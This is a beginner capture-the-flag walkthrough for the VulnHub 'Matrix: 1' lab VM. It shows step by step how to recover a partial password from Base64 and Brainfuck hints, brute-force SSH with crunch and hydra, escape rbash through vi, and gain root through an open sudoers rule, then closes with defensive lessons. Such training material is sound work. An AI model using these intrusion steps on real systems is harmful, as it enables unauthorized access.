# Matrix: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Matrix: 1 |
| **Difficulty** | Intermediate |
| **Author** | Ajay Verma |
| **Released** | 2018-08-19 |
| **VulnHub Entry** | <https://vulnhub.com/entry/matrix-1,259/> |
| **Download** | <https://vulnhub.com/entry/matrix-1,259/#download> |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux |

> A "follow the white rabbit" boot2root. The theme is decoders and rabbit holes:
> the web pages hide a hint as **Base64**, that hint points to a file written in
> **Brainfuck**, and the decoded file gives you a partial SSH password that you
> rebuild with `crunch`. After logging in you escape a **restricted shell**
> (`rbash`) and find `sudo` is wide open. Everything is a decode/reasoning
> puzzle, not a memory-corruption exploit. Filenames and prompts can vary
> slightly between builds of the OVA.

---

## 0. What you will learn

- How to find a target and scan it with `nmap`.
- How to read HTML **source code**, not just the rendered page, for hidden hints.
- How to recognise and decode **Base64** and **Brainfuck**.
- How to generate a targeted wordlist with `crunch` when part of a password is known.
- How to brute-force **SSH** with `hydra`.
- How to escape a **restricted bash shell (`rbash`)** using `vi`.
- How a loose **`sudoers`** entry leads to full `root` access.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able
to import an OVA.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated lab network.

```bash
# Identify your own IP + subnet first (the "eth0" adapter is the lab NIC)
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** the lab NIC holds a `192.168.56.x` (VirtualBox host-only)
> or `192.168.19x.x` (VMware) address. The target is on the **same** subnet.

```bash
# Two equivalent, fast ways to find live hosts on the subnet
sudo netdiscover -r 192.168.56.0/24
# or:
sudo arp-scan --interface=eth0 --localnet
```

```text
Currently scanning: 192.168.56.0/24
 192.168.56.1    0a:00:27:00:00:00  ...
 192.168.56.101  08:00:27:4d:5e:6f  ...  <-- our target
```

> **Why it works:** `netdiscover` and `arp-scan` broadcast ARP requests and list
> every machine that replies. ARP is layer 2, so it finds hosts even if they
> block ping.

**Target IP:** `192.168.56.101`

![netdiscover finding Matrix at 192.168.56.101](images/01-recon.png)

---

## 2. Enumeration

> **Goal:** find open ports and services, then enumerate the web apps.

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 22,80,31337 -oA scans/services 192.168.56.101
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00050s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
31337/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

> **How to read it:** three attack surfaces — SSH (22), a normal web server (80),
> and a **second web server on an unusual high port (31337)**. Non-standard
> ports are almost always deliberately placed by the challenge author.

### 2.1 The rabbit hole on port 80

```bash
curl -s http://192.168.56.101/ | head -40
```

```text
<html>
  ...
  <body>
    <h1>Follow the White Rabbit.</h1>
    <img src="images/white_rabbit.jpg:31337">
  </body>
</html>
```

> **Why it works:** the image `src` is malformed — it references port `31337`.
> The author is telling you to go look at the *other* web server.

### 2.2 The hidden Base64 on port 31337

```bash
curl -s http://192.168.56.101:31337/ | grep -i "base64\|<!--"
```

```text
<!-- ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg= -->
```

> **Why it works:** the HTML comment holds a **Base64** string. Base64 is just a
> way to encode arbitrary bytes as text; it is trivially reversible. Decode it:

```bash
echo "ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=" | base64 -d
```

```text
echo "Then you'll see, that it is not the spoon that bends, it is only yourself. " > Cypher.matrix
```

> **How to read it:** the decoded text is a shell command that *creates a file*
> named `Cypher.matrix`. So the author is hinting there is a file called
> `Cypher.matrix` we should fetch.

![decoding the Base64 comment](images/02-enum.png)

### 2.3 Fetch and decode `Cypher.matrix` (Brainfuck)

```bash
curl -s http://192.168.56.101:31337/Cypher.matrix -o Cypher.matrix
file Cypher.matrix
head -c 200 Cypher.matrix; echo
```

```text
Cypher.matrix: ASCII text
+++++ ++++[ ->+++ +++++ +++++ ...
```

> **Why it works:** a block of only `+ - < > . , [ ]` characters is the
> **Brainfuck** esoteric language. Its output is text you can read. Decode it
> online (e.g. <https://copy.sh/brainfuck/>) or with a local interpreter:

```bash
# One example of a local decoder (any Brainfuck interpreter produces the same text)
beef Cypher.matrix 2>/dev/null || echo "use https://copy.sh/brainfuck/ and paste the file"
```

```text
You can enter into matrix as guest, with password k1ll0rXX
Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password.
```

> **How to read it:** the username is `guest` and the password is `k1ll0r`
> plus **two unknown characters**. We will brute-force only those two.

---

## 3. Foothold

> **Goal:** turn the partial password into an SSH shell.

### 3.1 Generate the candidate passwords with `crunch`

```bash
# 8-char words: "k1ll0r" + one digit (%) + one lowercase letter (@)
crunch 8 8 -t k1ll0r%@ -o dict.txt
head -3 dict.txt; wc -l dict.txt
```

```text
k1ll0r00
k1ll0r01
k1ll0r02
260
```

> **Why it works:** `-t k1ll0r%@` builds a pattern. `%` is replaced by every
> digit `0-9`, `@` by every lowercase letter `a-z`. That is only
> `10 × 26 = 260` candidates — small enough to try in seconds.

### 3.2 Brute-force SSH with `hydra`

```bash
hydra -l guest -P dict.txt ssh://192.168.56.101
```

```text
[22][ssh] host: 192.168.56.101   login: guest   password: k1ll0r7n
1 of 1 target successfully completed, 1 valid password found
```

> **Why it works:** `hydra` opens a fresh SSH connection per candidate and looks
> for a successful authentication. Because we cut the search space from
> billions of passwords down to 260, it finishes almost instantly.

```bash
ssh guest@192.168.56.101
# password: k1ll0r7n
```

```text
guest@matrix:~$
```

![hydra finding guest:k1ll0r7n and the SSH login](images/04-foothold.png)

### 3.3 Escape the restricted shell (`rbash`)

Try a normal command:

```bash
ls
```

```text
-rbash: ls: command not found
```

> **How to read it:** the prompt works, but `ls`, `cd`, `/bin/bash` … are all
> denied. This is **`rbash`** — a restricted Bash that limits `PATH` and blocks
> commands containing `/`. We were placed here on purpose.

Use `vi` (which the author left in the restricted `PATH`) to launch a full shell:

```bash
vi
# inside vi press:  :set shell=/bin/bash
# then press:       :shell
```

```text
guest@matrix:~$    # now a real bash prompt
```

> **Why it works:** `vi` can spawn a sub-shell with `:shell`. Because that
> sub-shell is **not** restricted, we have escaped `rbash`. Fix the environment:

```bash
export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:$PATH
```

### 3.4 Full-fledged shell (optional)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then:  stty raw -echo; fg   ; and:  export TERM=xterm
```

---

## 4. Privilege escalation

> **Goal:** go from `guest` to `root`.

Check what `guest` can run as another user:

```bash
sudo -l
```

```text
Matching Defaults entries for guest on matrix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User guest may run the following commands on matrix:
    (ALL : ALL) ALL
```

> **Why it works:** `(ALL : ALL) ALL` means `guest` may run **anything** as
> **any** user (including `root`) after typing their own password. This is a
> deliberately bad `sudoers` configuration.

```bash
sudo su
# password: k1ll0r7n
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

An even cleaner version keeps a usable environment:

```bash
sudo -i          # or:  sudo /bin/bash -l
```

> **How to read it:** `sudo su` starts a root shell using `guest`'s password.
> The `id` output `uid=0` confirms we are now root.

### The root flag

```bash
cat /root/flag.txt
```

```text
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
  ... flag contents ...        (varies by build)
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
```

![root shell and /root/flag.txt](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Hint / credential disclosure in page source | HTML comment on port 31337 | Leaks the `Cypher.matrix` filename (Base64) |
| 2 | Partial password disclosure | `Cypher.matrix` (Brainfuck) | Username `guest` + 6 of 8 password chars |
| 3 | Weak/guessable SSH password | OpenSSH on port 22 | Easy brute-force to `guest:k1ll0r7n` |
| 4 | Restricted shell is escapable | `rbash` + `vi` in `PATH` | Full shell via `:shell` |
| 5 | Over-permissive sudoers | `guest (ALL : ALL) ALL` | Trivial full `root` access |

## 6. Defensive lessons (blue team)

- **Never leave hints or secrets in served files.** Base64 and Brainfuck are
  encodings, not security. Strip comments and encode nothing sensitive.
- **Enforce strong, unique passwords and disable SSH password auth** in favour of
  keys. Even when 6 of 8 characters leak, a strong password should still be
  unguessable — and a lockout policy would stop 260 attempts outright.
- **`rbash` is not a security boundary.** If you need confinement, use a proper
  jail/container and remove editors and shell-escape paths from `PATH`.
- **Fix `sudoers`:** grant the *specific* commands each user needs, never
  `(ALL : ALL) ALL`. Audit with `visudo -c` and monitor `sudo` logs.
- **Logging/detection:** alert on bursts of SSH authentication failures, on
  `sudo -l`/`sudo su` from unexpected accounts, and on the use of `vi`/`vim`
  sub-shell escapes in restricted contexts.

---

## 7. References

- VulnHub entry: <https://vulnhub.com/entry/matrix-1,259/>
- Community writeups consulted:
  - [Matrix 1: CTF walkthrough (Infosec Institute)](https://www.infosecinstitute.com/resources/capture-the-flag/matrix-1-ctf-walkthrough/)
  - [Getting root: Matrix (Armored Code)](https://armoredcode.com/blog/getting-root-matrix/)
  - [Vulnhub Matrix: 1 Walkthrough (fistfulofsecurity)](https://fistfulofsecurity.blogspot.com/2018/11/vulnhub-matrix-1-walkthrough.html)
  - [Matrix 1 – Vulnhub Walkthrough (Knight Squad)](https://blog.knightsquad.org/hacking/ctf-walkthrough/matrix-1-vulnhub-walkthrough/)
- Tools / references:
  - [Base64 (Wikipedia)](https://en.wikipedia.org/wiki/Base64)
  - [Brainfuck (Wikipedia)](https://en.wikipedia.org/wiki/Brainfuck)
  - [Online Brainfuck interpreter](https://copy.sh/brainfuck/)
  - [Hydra – THC](https://github.com/vanhauser-thc/thc-hydra)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (`netdiscover` / `arp-scan`)
- [ ] `images/02-enum.png` — decoding the Base64 comment on port 31337
- [ ] `images/03-enum.png` — decoding `Cypher.matrix` (Brainfuck) to `guest:k1ll0rXX`
- [ ] `images/04-foothold.png` — `crunch` + `hydra` + SSH login as `guest`
- [ ] `images/05-shell.png` — escaping `rbash` with `vi` (`:shell`)
- [ ] `images/06-user-flag.png` — local enumeration as `guest`
- [ ] `images/07-privesc.png` — `sudo -l` showing `(ALL : ALL) ALL`
- [ ] `images/08-root-flag.png` — root shell and `/root/flag.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
